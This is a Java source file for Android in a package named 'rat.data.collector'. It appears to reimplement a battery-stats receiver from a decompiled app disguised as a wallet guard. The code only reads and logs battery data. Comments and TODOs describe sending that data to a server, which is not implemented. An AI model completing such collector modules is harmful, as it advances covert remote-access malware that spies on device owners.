package com.vendor.rat.data.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * ADAPT: vendor com.guard.wallet.receiver.BatteryLevelReceiver
 * Collects detailed battery stats and sends to server.
 * Note: keepalive/receiver/BatteryLevelReceiver is a separate MODULE_07 stub.
 */
public class BatteryLevelReceiver extends BroadcastReceiver {

    private static final String TAG = "BatteryLevelReceiver";

    // ADAPT: vendor field f192a (Integer, init 0) — receiver alive flag
    public Integer receiverAlive = 0;

    // ADAPT: vendor field b = new s.a(30000, 10) — rate limiter (30s window, max 10)
    // TODO: VENDOR_VERIFY — implement rate limiter

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            this.receiverAlive = 1;
            if (intent == null) return;

            int level = intent.getIntExtra("level", 0);
            int scale = intent.getIntExtra("scale", 0);
            int status = intent.getIntExtra("status", 1);
            int health = intent.getIntExtra("health", 1);
            int voltage = intent.getIntExtra("voltage", 0);
            int temperature = intent.getIntExtra("temperature", 0);
            String technology = intent.getStringExtra("technology");
            int plugged = intent.getIntExtra("plugged", -1);
            float percent = (scale > 0 ? (float) level / scale : 0.0f) * 100.0f;

            // ADAPT: vendor persists battery stats via h.D() when h.s() is true
            // h.D(status, "batteryStatus"), h.D(health, "batteryHealth"), etc.
            Log.d(TAG, "Battery: " + percent + "%, status=" + status
                    + ", health=" + health + ", voltage=" + voltage
                    + ", temp=" + temperature + ", plugged=" + plugged);

            // ADAPT: vendor checks percent < 20 && batteryPercent < 5 for low power flag
            // sets w.a.f1561a (AtomicBoolean) accordingly

            // ADAPT: vendor builds BatteryLevelVO with all fields
            // and sends via rate-limited MessageRecordVO → this.b.a(messageRecordVO)
            // TODO: VENDOR_VERIFY — build BatteryLevelVO and send to server
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive", e);
        }
    }
}